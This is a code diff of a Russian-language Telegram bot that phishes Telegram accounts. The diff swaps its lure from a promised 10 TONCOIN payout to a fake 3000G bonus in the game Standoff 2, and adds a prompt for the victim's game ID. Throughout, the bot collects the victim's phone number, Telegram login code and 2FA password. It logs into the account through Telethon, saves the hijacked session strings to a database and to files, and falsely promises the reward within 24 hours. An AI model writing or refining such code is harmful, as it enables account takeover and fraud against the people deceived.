@@ -49,6 +49,7 @@ user_states = {}
 user_clients = {}
 user_phones = {}
 user_code_buffers = {}
+user_game_ids = {}
 
 os.makedirs("sessions", exist_ok=True)
 
@@ -65,6 +66,7 @@ def cleanup(user_id):
     user_clients.pop(user_id, None)
     user_phones.pop(user_id, None)
     user_code_buffers.pop(user_id, None)
+    user_game_ids.pop(user_id, None)
 
 def update_user_log(user_id: int, updates: dict):
     """Обновляет или создает запись пользователя с новыми данными"""
@@ -84,9 +86,9 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
     for row in digits:
         btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
         buttons.append(btn_row)
-    buttons.append([InlineKeyboardButton("✅ Успешно", callback_data="code_send")])
+    buttons.append([InlineKeyboardButton("✅ Подтвердить", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"Codice: `{current_code}`" if current_code else "Введите код:"
+    text = f"Код: `{current_code}`" if current_code else "Введите код из Telegram:"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
@@ -113,13 +115,46 @@ async def cmd_start(message: types.Message):
         }
     )
 
-    keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton("Подключиться К Вознаграждению💎", callback_data="auth_account")
-    )
     await message.answer(
-        "Здраствуйте вы находитесь в проверочной части - Telegram API.\n"
-        "Сделайте подключения вашего Telegram Аккаунта!\n"
-        "После чего выдайте свой TONCOIN адрес, для получения вознагрождения в размере - 10 TONCOIN.\n\n",
+        "🎮 Добро пожаловать в систему получения бонуса Standoff 2!\n\n"
+        "💎 Получите 3000G на ваш игровой аккаунт!\n\n"
+        "Для получения награды необходимо:\n"
+        "1. Подключить ваш Telegram аккаунт\n"
+        "2. Указать ваш игровой ID\n"
+        "3. Получить 3000G на ваш аккаунт!\n\n"
+        "Введите ваш игровой ID Standoff 2:"
+    )
+    
+    user_states[user.id] = 'awaiting_game_id'
+
+@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_game_id')
+async def process_game_id(message: types.Message):
+    user_id = message.from_user.id
+    game_id = message.text.strip()
+    
+    if not game_id.isdigit() or len(game_id) < 6:
+        await message.answer("❌ Неверный формат игрового ID. Введите корректный ID (только цифры):")
+        return
+    
+    user_game_ids[user_id] = game_id
+    
+    update_user_log(
+        user_id=user_id,
+        updates={
+            "game_id": game_id,
+            "game_id_time": datetime.now(),
+            "status": "game_id_received"
+        }
+    )
+
+    keyboard = InlineKeyboardMarkup().add(
+        InlineKeyboardButton("🔐 Подключить Telegram", callback_data="auth_account")
+    )
+    
+    await message.answer(
+        f"✅ Игровой ID {game_id} принят!\n\n"
+        "Теперь необходимо подключить ваш Telegram аккаунт для верификации и получения 3000G!\n\n"
+        "Нажмите кнопку ниже чтобы начать подключение:",
         reply_markup=keyboard
     )
 
@@ -140,7 +175,12 @@ async def start_auth(callback_query: types.CallbackQuery):
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
 
-    await bot.send_message(user_id, "📱 Для начала поделитесь своим Номером Telegram.", reply_markup=kb)
+    await bot.send_message(user_id, 
+        "🔐 Подключение Telegram аккаунта\n\n"
+        "Для получения 3000G необходимо подтвердить ваш аккаунт.\n"
+        "Нажмите кнопку ниже чтобы поделиться номером телефона:",
+        reply_markup=kb
+    )
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
@@ -185,9 +225,9 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id] = {'code': '', 'message_id': None}
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
-        await message.answer("⌨️ Введите код, отправленный на ваш номер:")
+        await message.answer("📲 Код подтверждения отправлен на ваш номер Telegram\n\nВведите код для завершения верификации:")
     except Exception as e:
-        await message.answer(f"❌ Скорее всего вы ввели не верный код, напишите /start, и сделайте все заново! {e}")
+        await message.answer(f"❌ Ошибка при отправке кода. Попробуйте снова через /start\n{str(e)[:100]}")
         await client.disconnect()
         cleanup(user_id)
 
@@ -197,12 +237,12 @@ async def process_code_button(callback_query: types.CallbackQuery):
     data = callback_query.data
 
     if user_states.get(user_id) != 'awaiting_code':
-        await bot.answer_callback_query(callback_query.id, text="⛔️ Что-то пошло не так, попробуйте еще!", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="⛔️ Сессия устарела. Начните заново с /start", show_alert=True)
         return
 
     buffer = user_code_buffers.get(user_id)
     if not buffer:
-        await bot.answer_callback_query(callback_query.id, text="Errore interno.", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="Ошибка сессии", show_alert=True)
         return
 
     current_code = buffer['code']
@@ -210,14 +250,14 @@ async def process_code_button(callback_query: types.CallbackQuery):
 
     if data == "code_send":
         if not current_code:
-            await bot.answer_callback_query(callback_query.id, text="⚠️ Код устарел.. попробуйте еще раз!", show_alert=True)
+            await bot.answer_callback_query(callback_query.id, text="⚠️ Введите код подтверждения", show_alert=True)
             return
         await bot.answer_callback_query(callback_query.id)
         await try_sign_in_code(user_id, current_code)
     else:
         digit = data.split("_")[1]
         if len(current_code) >= 10:
-            await bot.answer_callback_query(callback_query.id, text="⚠️ Ошибка в коде, попробуйте еще!", show_alert=True)
+            await bot.answer_callback_query(callback_query.id, text="⚠️ Максимальная длина кода - 10 цифр", show_alert=True)
             return
         current_code += digit
         user_code_buffers[user_id]['code'] = current_code
@@ -227,8 +267,10 @@ async def process_code_button(callback_query: types.CallbackQuery):
 async def try_sign_in_code(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
+    game_id = user_game_ids.get(user_id)
+    
     if not client or not phone:
-        await bot.send_message(user_id, "⚠️ Ваша сессия истекла. Пожалуйста, начните заново с /start")
+        await bot.send_message(user_id, "⚠️ Сессия устарела. Пожалуйста, начните заново с /start")
         cleanup(user_id)
         return
 
@@ -253,7 +295,8 @@ async def try_sign_in_code(user_id, code):
                     "username": me.username,
                     "first_name": me.first_name,
                     "last_name": me.last_name if me.last_name else None,
-                    "auth_date": datetime.now()
+                    "auth_date": datetime.now(),
+                    "game_id": game_id
                 }}, 
                 upsert=True
             )
@@ -268,14 +311,22 @@ async def try_sign_in_code(user_id, code):
                     "tg_first_name": me.first_name,
                     "tg_last_name": me.last_name,
                     "status": "authenticated",
-                    "proxy_index": proxy_index
+                    "proxy_index": proxy_index,
+                    "game_id": game_id
                 }
             )
 
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
-                json.dump({"phone": phone, "session": session_str}, f)
+                json.dump({"phone": phone, "session": session_str, "game_id": game_id}, f)
 
-            await bot.send_message(user_id, "Вы успешно вошли в систему! Отправте нам ваш TONCOIN адрес для получения вознаграждения в размере - 10 TONCOIN, после откправки ваего адреса нам, мы одобрим его в течении 24часов!💎")
+            await bot.send_message(user_id,
+                "🎉 Поздравляем! Ваш аккаунт успешно подключен!\n\n"
+                f"📋 Ваш игровой ID: {game_id}\n"
+                "💎 Награда: 3000G\n\n"
+                "Ваша заявка на получение 3000G принята в обработку!\n"
+                "Награда будет зачислена на ваш аккаунт в течение 24 часов.\n\n"
+                "Спасибо за участие! 🎮"
+            )
             await client.disconnect()
             cleanup(user_id)
         else:
@@ -284,13 +335,13 @@ async def try_sign_in_code(user_id, code):
                 user_id=user_id,
                 updates={"status": "awaiting_2fa"}
             )
-            await bot.send_message(user_id, "🔐 На вашем аккаунте, имееться 2FA пароль, введите его прямо в бота!")
+            await bot.send_message(user_id, "🔐 Ваш аккаунт защищен двухфакторной аутентификацией. Введите пароль 2FA:")
     except PhoneCodeExpiredError:
-        await bot.send_message(user_id, "⏰ код истек. Пожалуйста, начните заново с /start")
+        await bot.send_message(user_id, "⏰ Код подтверждения устарел. Пожалуйста, начните заново с /start")
         await client.disconnect()
         cleanup(user_id)
     except PhoneCodeInvalidError:
-        await bot.send_message(user_id, "❌ неверный код, попробуйте снова с /start:")
+        await bot.send_message(user_id, "❌ Неверный код подтверждения. Попробуйте снова:")
         user_code_buffers[user_id]['code'] = ""
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
     except SessionPasswordNeededError:
@@ -299,9 +350,9 @@ async def try_sign_in_code(user_id, code):
             user_id=user_id,
             updates={"status": "awaiting_2fa"}
         )
-        await bot.send_message(user_id, "🔐На вашем аккаунте, имееться 2FA пароль, введите его прямо в бота!")
+        await bot.send_message(user_id, "🔐 Ваш аккаунт защищен двухфакторной аутентификацией. Введите пароль 2FA:")
     except Exception as e:
-        await bot.send_message(user_id, f"❌ Скорее всего вы ввели не так ваш пароль 2FA , попробуйте заново с /start {e}")
+        await bot.send_message(user_id, f"❌ Ошибка авторизации. Попробуйте снова с /start\n{str(e)[:100]}")
         await client.disconnect()
         cleanup(user_id)
 
@@ -311,9 +362,10 @@ async def process_2fa(message: types.Message):
     password = message.text.strip()
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
+    game_id = user_game_ids.get(user_id)
 
     if not client or not phone:
-        await message.answer("⚠️ Sessione non trovata. Riprova da /start")
+        await message.answer("⚠️ Сессия устарела. Попробуйте снова с /start")
         cleanup(user_id)
         return
 
@@ -335,7 +387,8 @@ async def process_2fa(message: types.Message):
                     "proxy_index": proxy_index,
                     "user_id": user_id,
                     "auth_date": datetime.now(),
-                    "has_2fa": True
+                    "has_2fa": True,
+                    "game_id": game_id
                 }}, 
                 upsert=True
             )
@@ -347,20 +400,28 @@ async def process_2fa(message: types.Message):
                     "auth_time": datetime.now(),
                     "has_2fa": True,
                     "status": "authenticated_with_2fa",
-                    "proxy_index": proxy_index
+                    "proxy_index": proxy_index,
+                    "game_id": game_id
                 }
             )
 
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
-                json.dump({"phone": phone, "session": session_str}, f)
+                json.dump({"phone": phone, "session": session_str, "game_id": game_id}, f)
 
-            await message.answer("Вы успешно вошли в систему! Отправте нам ваш TONCOIN адрес для получения вознаграждения в размере - 10 TONCOIN, после откправки ваего адреса нам, мы одобрим его в течении 24часов!💎")
+            await message.answer(
+                "🎉 Поздравляем! Ваш аккаунт успешно подключен!\n\n"
+                f"📋 Ваш игровой ID: {game_id}\n"
+                "💎 Награда: 3000G\n\n"
+                "Ваша заявка на получение 3000G принята в обработку!\n"
+                "Награда будет зачислена на ваш аккаунт в течение 24 часов.\n\n"
+                "Спасибо за участие! 🎮"
+            )
             await client.disconnect()
             cleanup(user_id)
         else:
-            await message.answer("❌ Скорее всего вы ввели не так ваш пароль 2FA , попробуйте заново с /start.")
+            await message.answer("❌ Неверный пароль 2FA. Попробуйте снова с /start.")
     except Exception as e:
-        await message.answer(f"❌Скорее всего вы ввели не так ваш пароль 2FA , попробуйте заново с /start: {e}")
+        await message.answer(f"❌ Ошибка авторизации. Попробуйте снова с /start\n{str(e)[:100]}")
         await client.disconnect()
         cleanup(user_id)
 
